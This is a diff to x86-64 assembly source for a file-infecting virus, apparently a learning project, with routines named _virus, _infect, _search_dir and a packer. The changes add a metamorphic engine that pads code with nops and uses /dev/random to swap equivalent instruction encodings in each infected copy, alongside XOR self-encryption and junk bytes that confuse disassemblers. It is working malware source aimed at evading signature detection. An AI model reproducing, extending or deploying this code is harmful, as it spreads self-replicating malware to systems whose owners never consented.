@@ -62,6 +62,9 @@ _h3ll0w0rld:
 		push rcx
 		lea rdi, [rel self_status]
 		xor rsi, rsi; O_RDONLY
+		nop
+		nop
+		nop
 
 		jmp $+6
 		db `\x42\x42\x48\xbf`; TRASH ; 42; 42; mov rdi,
@@ -85,6 +88,9 @@ _h3ll0w0rld:
 		db `\x48\x8d`; TRASH ; lea rax, rcx
 
 		xor rax, rax; SYSCALL_READ
+		nop
+		nop
+		nop
 		syscall
 
 		jmp $+4
@@ -133,7 +139,7 @@ _h3ll0w0rld:
 %endif
 
 	cmp rax, 0x0
-	jnz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
+	jnz .sneakyboi; has to jmp on [48 31 c0] -> xor rax, rax
 	jmp .happy_mix
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
 		push rdx
@@ -186,9 +192,9 @@ _h3ll0w0rld:
 	db `\x42`
 	syscall
 	jmp .infected
-	xor rax, rax
-
 	.sneakyboi:
+	mov rax, 0
+	nop
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jnz .code ; .xor_decrypt
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
@@ -235,8 +241,12 @@ _xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	push r9
 
 	xor r8, r8; i len
+	nop
+	nop
+	nop
 	.reset_key_size:
-		xor r9, r9; j key_size
+		mov r9, 0; j key_size
+		nop
 	.loop_bytes:
 		cmp r8, rsi
 		je .return
@@ -256,14 +266,23 @@ ret
 _exit:
 	push SYSCALL_EXIT
 	pop rax ; exit
-	xor rdi, rdi; = 0
+	xor rdi, rdi
+	nop
+	nop
+	nop
 	syscall
 
 _ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
 	push rcx
 
 	xor rax, rax
-	xor rcx, rcx; = 0
+	nop
+	nop
+	nop
+	xor rcx, rcx
+	nop
+	nop
+	nop
 	cmp rcx, rdx
 	je .empty_return
 	dec rdx
@@ -288,14 +307,23 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 	push r9
 	push rbx
 
-	xor rax,rax
+	xor rax, rax
+	nop
+	nop
+	nop
 	xor r8, r8
+	nop
+	nop
+	nop
 	cmp rsi, rcx
 	jl .return
 	cmp rcx, 0x0
 	je .return
 	.loop_byte:
-		xor rax,rax
+		xor rax, rax
+		nop
+		nop
+		nop
 		cmp r8, rsi
 		je .return
 		mov rbx, rdi
@@ -330,7 +358,10 @@ _ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
 ret
 
 _ft_strlen:; (string rdi)
-	xor rax, rax; = 0
+	xor rax, rax
+	nop
+	nop
+	nop
 	.loop_char:
 		cmp byte [rdi + rax], 0
 		jz .return
@@ -345,7 +376,10 @@ _virus:
 	push r9
 
 	; copy the virus into a mmap executable
-	xor rdi, rdi; NULL
+	xor rdi, rdi
+	nop
+	nop
+	nop
 
 	lea rsi, [rel _eof]
 	lea r8, [rel _params]
@@ -357,6 +391,9 @@ _virus:
 	push -1
 	pop r8 ; fd
 	xor r9, r9; offset
+	nop
+	nop
+	nop
 	push SYSCALL_MMAP
 	pop rax; mmap
 	syscall
@@ -445,8 +482,17 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 	pop r11
 
 	xor rax, rax
-	xor rcx, rcx; i
-	xor r8, r8; j
+	nop
+	nop
+	nop
+	xor rcx, rcx
+	nop
+	nop
+	nop
+	xor r8, r8
+	nop
+	nop
+	nop
 	.loop_uncompress:
 		cmp rcx, r11
 		jge .end_loop
@@ -468,7 +514,8 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 			push rax
 			pop rdx
 			call _ft_memcpy
-			xor rax, rax
+			mov rax, 0
+			nop
 			mov al, byte[r10 + rcx + 2]
 			add r8, rax
 			add rcx, 3
@@ -508,9 +555,9 @@ ret
 
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
-; = DEBUG
-;	db `pack_start`, 0x0
-; =
+%ifdef DEBUG
+	db `pack_start`, 0x0
+%endif
 _search_dir:
 %ifdef FSOCIETY
 	push SYSCALL_GETEUID; geteuid
@@ -1126,7 +1173,9 @@ _infect:
 	push r8
 	push rsi
 	push rcx
+	push rdx
 	call _metamorph
+	pop rdx
 	pop rcx
 	pop rsi
 	pop r8
@@ -1224,15 +1273,16 @@ ret
 
 _metamorph:; (rdi -> ptr)
 	; xor_encrypt
+	; swap registry r8, r9 -> r9, r10 -> ... -> r14, r15 -> r8, r9 -> ...
 	lea rax, [rel _params]
 	lea rsi, [rel _exit]
 	lea rcx, [rel _xor_encrypt]
 	sub rsi, rcx
 	sub rcx, rax
+	sub rdi, 8 * 3
 	mov rax, rdi
 	push rax
 	add rdi, rcx
-	sub rdi, 8 * 3
 	xor rcx, rcx
 	cmp byte[rdi + 1], 0x56
 	je .reset_metamorph_xor_encrypt
@@ -1298,7 +1348,193 @@ _metamorph:; (rdi -> ptr)
 	jmp .reset_metamorph_xor_encrypt
 	.break:
 	pop rax
+	; normal registry 64
+	; mov rax, 0; nop -> X 0 0 0 0 90
+	; xor rax, rax nop nop nop -> 48 31 X 90 90 90
+	; special registry 
+	; mov r8, 0; nop -> 41 X 0 0 0 0
+	; xor r8, r8; nop nop nop -> 4d 31 X 90 90 90
+	mov rdi, rax
+	push rax
+	lea rsi, [rel _pack_start]
+	lea rax, [rel _params]
+	sub rsi, rax
+	lea rcx, [rel _h3ll0w0rld]
+	sub rcx, rax
+	add rdi, rcx
+	xor rcx, rcx
+	.substitute_instruction:
+		cmp rcx, rsi
+		jge .end_substitute_instruction
+		mov rax, rdi
+		push rax
+		add rdi, rcx
+		push rsi
+		cmp word[rdi], `\x48\x31`
+		je .swap_instruction_pattern_a
+		cmp word[rdi], `\x4d\x31`
+		je .swap_instruction_pattern_b
+		cmp dword[rdi + 1], `\x00\x00\x00\x00`
+		je .swap_instruction_pattern_c
+		cmp byte[rdi], 0x41
+		je .swap_instruction_pattern_d
+		jmp .inc_rcx
+		.swap_instruction_pattern_a:
+			cmp byte[rdi + 3], 0x90
+			jne .inc_rcx
+			cmp word[rdi + 4], 0x9090
+			jne .inc_rcx
+			call _yes_or_no
+			cmp rax, 0x0
+			jne .inc_rcx
+			mov rdx, rdi
+			push rdi
+			push rcx
+			lea rdi, [rel swap_registry]
+			mov rsi, 16
+			add rdx, 2
+			mov rcx, 1
+			call _ft_memmem
+			pop rcx
+			pop rdi
+			cmp rax, 0x0
+			je .inc_rcx
+			inc rax
+			xor rdx, rdx
+			mov dl, byte[rax]
+			mov byte[rdi], dl
+			mov dword[rdi + 1], 0x00000000
+			jmp .inc_rcx
+		.swap_instruction_pattern_b:
+			cmp byte[rdi + 3], 0x90
+			jne .inc_rcx
+			cmp word[rdi + 4], 0x9090
+			jne .inc_rcx
+			call _yes_or_no
+			cmp rax, 0x0
+			jne .inc_rcx
+			mov rdx, rdi
+			push rdi
+			push rcx
+			lea rdi, [rel swap_registry]
+			mov rsi, 16
+			add rdx, 2
+			mov rcx, 1
+			call _ft_memmem
+			pop rcx
+			pop rdi
+			cmp rax, 0x0
+			je .inc_rcx
+			inc rax
+			xor rdx, rdx
+			mov dl, byte[rax]
+			mov byte[rdi], 0x41
+			mov byte[rdi + 1], dl
+			mov dword[rdi + 2], 0x00000000
+			jmp .inc_rcx
+		.swap_instruction_pattern_c:
+			cmp byte[rdi + 5], 0x90
+			jne .inc_rcx
+			call _yes_or_no
+			cmp rax, 0x0
+			jne .inc_rcx
+			mov rdx, rdi
+			push rdi
+			push rcx
+			lea rdi, [rel swap_registry]
+			mov rsi, 16
+			add rdx, 2
+			mov rcx, 1
+			call _ft_memmem
+			pop rcx
+			pop rdi
+			cmp rax, 0x0
+			je .inc_rcx
+			dec rax
+			xor rdx, rdx
+			mov dl, byte[rax]
+			mov word[rdi], `\x48\x31`
+			mov byte[rdi + 2], dl
+			mov word[rdi + 3], 0x9090
+			mov byte[rdi + 5], 0x90
+			jmp .inc_rcx
+		.swap_instruction_pattern_d:
+			cmp dword[rdi + 2], 0x00000000
+			jne .inc_rcx
+			call _yes_or_no
+			cmp rax, 0x0
+			jne .inc_rcx
+			mov rdx, rdi
+			push rdi
+			push rcx
+			lea rdi, [rel swap_registry]
+			mov rsi, 16
+			add rdx, 2
+			mov rcx, 1
+			call _ft_memmem
+			pop rcx
+			pop rdi
+			cmp rax, 0x0
+			je .inc_rcx
+			dec rax
+			xor rdx, rdx
+			mov dl, byte[rax]
+			mov word[rdi], `\x4d\x31`
+			mov byte[rdi + 2], dl
+			mov word[rdi + 3], 0x9090
+			mov byte[rdi + 5], 0x90
+			jmp .inc_rcx
+		.inc_rcx:
+			pop rsi
+			pop rdi
+			inc rcx
+	jmp .substitute_instruction
+	.end_substitute_instruction:
+	pop rax
 ret
+
+_yes_or_no:
+	push r11
+	push rdi
+	push rdx
+	push rcx
+	push rsi
+			xor rsi, rsi; O_RDONLY
+			lea rdi, [rel dev_random]
+			mov rax, SYSCALL_OPEN
+			syscall
+			sub rsp, 1
+
+			mov rdi, rax
+			mov rsi, rsp
+			mov rdx, 1
+			xor rax, rax; READ
+			syscall
+
+			xor rdx, rdx
+			xor rax, rax
+			movzx rax, byte[rsi]
+			add rsp, 1
+			push rdi
+			mov rdi, 2
+			div rdi
+			pop rdi
+			push rdx
+			mov rax, SYSCALL_CLOSE
+			syscall
+			pop rdx
+
+			mov rax, rdx
+
+	pop rsi
+	pop rcx
+	pop rdx
+	pop rdi
+	pop r11
+ret
+
+swap_registry db `\xc0\xb8\xff\xbf\xf6\xbe\xd2\xba\xc9\xb9\xdb\xbb\xe4\xbc\xed\xbd`
+dev_random db `/dev/random`, 0x0
 
 ;						fingerprint
 _update_fingerprint:; (string rdi)
